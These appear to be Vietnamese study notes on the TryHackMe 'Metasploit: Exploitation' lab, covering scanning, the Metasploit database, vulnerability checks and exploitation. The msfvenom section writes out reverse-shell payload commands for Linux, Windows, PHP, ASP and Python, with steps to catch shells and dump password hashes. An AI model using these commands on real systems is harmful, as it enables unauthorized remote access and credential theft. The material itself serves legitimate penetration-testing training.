# Metasploit: Exploitation

**Task 1: Introduction**

- Tìm hiểu cách sử dụng Metasploit để quét và khai thác lỗ hổng. 

- xem xét việc tạo payload bằng msfvenom và cách bắt đầu Meterpreter session trên hầu hết các nền tảng mục tiêu.

- Cách quét hệ thống mục tiêu bằng Metasploit.

- Cách sử dụng tính năng cơ sở dữ liệu Metasploit.

- Cách sử dụng Metasploit để tiến hành quét lỗ hổng.

- Cách sử dụng Metasploit để khai thác các dịch vụ dễ bị tấn công trên hệ thống mục tiêu.

- Cách sử dụng msfvenom để tạo payload và nhận Meterpreter session trên hệ thống đích.

**Task 2: Scanning**

- Metasploit có một số mô-đun để quét các cổng mở trên hệ thống và mạng đích. 

-  liệt kê các mô-đun quét cổng có sẵn bằng lệnh ***search portscan***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image24.png)

- Các mô-đun quét cổng sẽ yêu cầu thiết lập một số tùy chọn:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image25.png)

- ***CONCURRENCY***:  Số lượng mục tiêu được quét đồng thời.

- ***PORTS***: Phạm vi cổng được quét. Lưu ý rằng 1-1000 ở đây sẽ không giống với việc sử dụng Nmap với cấu hình mặc định. Nmap sẽ quét 1000 cổng được sử dụng nhiều nhất, trong khi Metasploit sẽ quét số cổng từ 1 đến 10000.

- ***RHOSTS***: Mục tiêu hoặc mạng mục tiêu được quét

- ***THREADS***: Số lượng threads sẽ được sử dụng đồng thời. Nhiều threads hơn sẽ giúp quét nhanh hơn.

- Có thể sử dụng nmap trong khi sử dụng Metasploit:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image26.png)

**UDP service Identification**

- Module ***scanner/discovery/udp_sweep*** sẽ cho phép nhanh chóng xác định các dịch vụ chạy trên UDP (User Datagram Protocol). 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image27.png)

**SMB Scans**

- Metasploit cung cấp một số auxiliary modules hữu ích cho phép quét các dịch vụ cụ thể, như ***smb_enumshares*** và ***smb_version***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image28.png)

- Không bỏ sót các dịch vụ như ***NetBIOS*** - cho phép máy tính giao tiếp qua mạng để chia sẻ file hoặc gửi file tới máy in. Tên NetBIOS của hệ thống đích có thể cho ý tưởng về vai trò và thậm chí tầm quan trọng của nó (ví dụ: CORP-DC, DEVOPS, SALES, v.v.).

=> Ví dụ nmap trên metasploit: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image29.png)

=> Ví dụ về module khám phá NetBIOS trên Metasploit:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image30.png)

=> Ví dụ về module khám phá http-version trên Metasploit: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image31.png)

=> Ví dụ sử dụng module khám phá username và password: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image32.png)

**Task 3: The Metasploit Database**

- Metasploit có chức năng cơ sở dữ liệu để đơn giản hóa việc quản lý dự án và tránh nhầm lẫn có thể xảy ra khi thiết lập các giá trị tham số.

- cần khởi động cơ sở dữ liệu ***PostgreSQL*** mà Metasploit sẽ sử dụng bằng lệnh sau: ***systemctl start postgresql*** .Sau đó, cần khởi tạo Metasploit Database bằng lệnh ***msfdb init***: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image33.png)

- Bây giờ khởi chạy ***msfconsole*** và kiểm tra trạng thái cơ sở dữ liệu bằng lệnh ***db_status***.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image34.png)

- Tính năng cơ sở dữ liệu sẽ cho phép tạo không gian làm việc để tách biệt các dự án khác nhau. Khi khởi chạy lần đầu tiên, ở trong không gian làm việc mặc định. Có thể liệt kê các không gian làm việc có sẵn bằng lệnh ***workspace***.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image35.png)

- Có thể thêm workspace bằng tùy chọn ***-a*** hoặc xóa không gian làm việc bằng tùy chọn ***-d*** tương ứng.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image36.png)

- có thể sử dụng lệnh ***workspace*** để điều hướng giữa các không gian làm việc chỉ bằng cách nhập ***workspace*** theo sau là tên không gian làm việc mong muốn.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image37.png)

- Khám phá thêm các tùy chọn khác: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image38.png)

- Dùng lệnh ***help*** khi khởi chạy Metasploit cùng với Database khác với khởi chạy Metasploit thông thường: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image39.png)

- chạy quét Nmap bằng ***db_nmap***, tất cả kết quả sẽ được lưu vào cơ sở dữ liệu.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image40.png)

- có thể tiếp cận thông tin liên quan đến hosts và services đang chạy trên hệ thống đích bằng các lệnh ***hosts*** và ***services***.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image41.png)

- Khi thông tin máy chủ được lưu trong Database, có thể sử dụng lệnh ***hosts -R*** để đặt giá trị RHOSTS.

**Example Workflow**

1. sử dụng mô-đun vulnerability scanning để tìm các lỗ hổng MS17-010 tiềm ẩn bằng lệnh ***use auxiliary/scanner/smb/smb_ms17_010***.

2. đặt giá trị RHOSTS bằng cách sử dụng ***hosts -R***.

3. nhập ***show options*** để kiểm tra xem tất cả các giá trị có được gán chính xác hay không. (Trong ví dụ này, 10.10.138.32 là địa chỉ IP đã quét trước đó bằng lệnh db_nmap)

4. Sau khi tất cả các tham số được đặt, khởi chạy khai thác bằng lệnh ***run*** hoặc ***exploit***.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image42.png)

- Nếu có nhiều hơn một hosts được lưu vào cơ sở dữ liệu, tất cả các địa chỉ IP sẽ được gán khi sử dụng lệnh ***hosts -R***. 

- Lệnh ***services*** được sử dụng với tùy chọn ***-S*** sẽ cho phép tìm kiếm các dịch vụ cụ thể trong môi trường.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image43.png)

- 1 số dịch vụ đáng quan tâm: 

1. ***HTTP***: Có khả năng lưu trữ một ứng dụng web nơi có thể tìm thấy các lỗ hổng như SQL Injection hoặc Remote Code Execution (RCE).

2. ***FTP***: Có thể cho phép đăng nhập ẩn danh và cung cấp quyền truy cập vào các tệp thú vị.

3. ***SMB***: Có thể dễ bị khai thác SMB như MS17-010

4. ***SSH***: Có thể có thông tin xác thực mặc định hoặc dễ đoán

5. ***RDP***: Có thể dễ bị Bluekeep tấn công hoặc cho phép truy cập vào máy tính để bàn nếu sử dụng thông tin xác thực yếu.

**Task 4: Vulnerability Scanning**

- Việc tìm ra lỗ hổng bằng Metasploit sẽ phụ thuộc rất nhiều vào khả năng quét và lấy dấu vân tay của mục tiêu. 

- Ví dụ: nếu xác định dịch vụ ***VNC*** đang chạy trên mục tiêu, có thể sử dụng lệnh ***search*** trên Metasploit để liệt kê các mô-đun hữu ích

    msf6 > use auxiliary/scanner/vnc/
    use auxiliary/scanner/vnc/ard_root_pw    use auxiliary/scanner/vnc/vnc_login      use auxiliary/scanner/vnc/vnc_none_auth
    msf6 > use auxiliary/scanner/vnc/

-  có thể sử dụng lệnh ***info*** cho bất kỳ mô-đun nào để hiểu rõ hơn về cách sử dụng và mục đích của nó.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image44.png)

=> mô-đun ***vnc_login*** có thể giúp tìm chi tiết đăng nhập cho dịch vụ VNC.

=> check SMTP servers for open relay: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image45.png)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image46.png)

**Task 5: Exploitation**

- Metasploit là một exploitation framework. Exploitation là loại mô-đun phổ biến nhất.

-  có thể tìm kiếm exploits bằng lệnh ***search***, lấy thêm thông tin về exploit bằng lệnh ***info*** và khởi chạy exploit bằng cách sử dụng lệnh ***exploit***.

- Hầu hết các hoạt động exploits sẽ có payload mặc định được cài sẵn. Tuy nhiên, có thể sử dụng lệnh ***show payloads*** để liệt kê các payload khác có thể sử dụng với cách khai thác cụ thể đó.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image47.png)

- Khi đã quyết định được payload, có thể sử dụng lệnh ***set payload***.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image48.png)

- Một số payloads sẽ yêu cầu các tham số mới mà có thể cần đặt, việc chạy lệnh ***show options*** một lần nữa có thể hiển thị các tham số này. Trong ví dụ trên, reverse payload ít nhất sẽ yêu cầu đặt tùy chọn ***LHOST***.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image49.png)

- Khi một session được mở, có thể chạy background session đó bằng cách sử dụng ***CTRL+Z*** hoặc hủy bỏ phiên đó bằng cách sử dụng ***CTRL+C***.

- Việc tạo background cho một session sẽ hữu ích khi làm việc trên nhiều mục tiêu cùng lúc hoặc trên cùng một mục tiêu với exploit và/hoặc shell khác.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image50.png)

**Working with sessions**

- Lệnh ***sessions*** sẽ liệt kê tất cả sessions hoạt động

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image51.png)

- có thể tương tác với bất kỳ session hiện có nào bằng cách sử dụng lệnh ***sessions -i***  theo sau là ID phiên.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image52.png)

=> ***shell_bind_tcp*** và ***shell_reverse_tcp***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image53.png)

=> Sử dụng ***shell_bind_tcp*** khi có quyền truy cập trực tiếp tới mục tiêu.

=> Sử dụng ***shell_reverse_tcp*** khi mục tiêu có firewall hoặc NAT. 

=> Questions: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image54.png)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image55.png)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image56.png)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image57.png)

**Task 6: Msfvenom**

- Msfvenom sẽ cho phép truy cập tất cả các payload có sẵn trong Metasploit framework. Msfvenom cho phép tạo payload ở nhiều định dạng khác nhau (PHP, exe, dll, elf, v.v.) và cho nhiều hệ thống mục tiêu khác nhau (Apple, Windows, Android, Linux, v.v.).

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image58.png)

**Output formats**

- có thể tạo các payload độc lập (stand-alone payloads), chẳng hạn như tệp thực thi Windows cho Meterpreter, hoặc xuất payload ở định dạng raw để sử dụng trong các ngôn ngữ lập trình như Python. Để xem danh sách các định dạng đầu ra được hỗ trợ,có thể sử dụng lệnh ***msfvenom --list formats***. 

**Encoders**

- bộ mã hóa (encoders) không được thiết kế để vượt qua phần mềm antivirus trên hệ thống mục tiêu. Mục đích chính của chúng là mã hóa payload

- Mặc dù việc mã hóa đôi khi có thể giúp bypass một số phần mềm antivirus, nhưng các kỹ thuật hiện đại như làm xáo trộn shellcode hoặc sử dụng phương pháp học máy thường hiệu quả hơn.

=> Ví dụ dưới đây minh họa cách sử dụng bộ mã hóa với tùy chọn ***-e***. Trong trường hợp này, phiên bản PHP của Meterpreter được mã hóa bằng Base64 và định dạng đầu ra là raw.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image59.png)

**Handlers**

- Khi sử dụng reverse shell, cần có khả năng chấp nhận các kết nối từ payload được tạo bởi MSFvenom. Trong các mô-đun khai thác, quá trình này thường được tự động xử lý. 

- Thuật ngữ ***"catching a shell"*** thường được dùng để chỉ việc nhận kết nối từ mục tiêu

- Các reverse shell hoặc callback từ Meterpreter có thể dễ dàng được xử lý bằng cách sử dụng Handlers.

=> Kịch bản ví dụ: khai thác lỗ hổng tải lên tệp trong DVWA (Damn Vulnerable Web Application). Mặc dù DVWA được sử dụng để minh họa, có thể áp dụng các bước tương tự trên các hệ thống mục tiêu khác. Các bước khai thác bao gồm:

1. Tạo shell PHP bằng MSFvenom

2. Khởi động Metasploit handler

3. Thực thi shell PHP

- MSFvenom yêu cầu cung cấp payload, địa chỉ IP máy cục bộ (LHOST) và cổng cục bộ (LPORT) mà payload sẽ kết nối.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image60.png)

***Lưu ý***: Tệp PHP đầu ra sẽ thiếu thẻ PHP bắt đầu được nhận xét và thẻ kết thúc (?>):

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image61.png)

=> Chỉnh sửa tệp PHP:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image62.png)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image63.png)

- sử dụng Multi Handler để nhận kết nối đến. Mô-đun này có thể được sử dụng với lệnh ***use exploit/multi/handler***.

- Để sử dụng mô-đun, cần set giá trị payload (php/reverse_php trong trường hợp này), giá trị LHOST và LPORT.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image64.png)

=> Thiết lập xong, dùng lệnh ***run*** và chờ kết nối đến: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image65.png)

- Khi reverse shell được kích hoạt, kết nối sẽ được multi/handler nhận và cung cấp shell.

**Other Payloads**

- Dựa trên cấu hình của hệ thống mục tiêu (hệ điều hành, máy chủ web, trình thông dịch, v.v.), msfvenom có thể tạo payload ở nhiều định dạng khác nhau.

***LHOST***: địa chỉ IP của máy tấn công

***LPORT***: cổng mà trình xử lý (handler) lắng nghe

1. ***Linux Executable and Linkable Format (elf):***

    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf

- Định dạng ***.elf*** tương đương với ***.exe*** trên Windows, là tệp thực thi cho Linux.

- Để thực thi tệp này trên máy mục tiêu, cần cấp quyền thực thi bằng lệnh:

    chmod +x shell.elf

- Sau đó chạy file: 

    ./shell.elf

2. ***Windows***

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

3. ***PHP***

    msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

4. ***ASP:***

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

5. ***Python***:

    msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

=> Tất cả các ví dụ trên đều là reverse payload, nghĩa là cần thiết lập một handler trên máy tấn công để xử lý kết nối từ payload.

=> Sử dụng mô-đun exploit/multi/handler và thiết lập các tham số LHOST và LPORT tương ứng với giá trị đã dùng khi tạo payload bằng msfvenom.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image66.png)

=> bên máy murphy dùng wget để tải payload này về và cấp quyền thực thi cho nó:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image67.png)

=> bên máy tấn công truy cập module exploit/multi/handler:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image68.png)

=> sau khi exploit, Sử dụng mô-đun post exploitation để kết xuất hàm băm của người dùng khác trên hệ thống:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Metasploit/images/image69.png)

**Task 7: Summary**

- Metasploit có thể giúp xác định các lỗ hổng tiềm ẩn trên hệ thống mục tiêu và khai thác các lỗ hổng này.

- msfvenom và tạo các tải trọng Meterpreter độc lập. Điều này đặc biệt hữu ích trong những trường hợp có thể tải tệp lên hệ thống đích hoặc có khả năng tải tệp xuống hệ thống đích. 
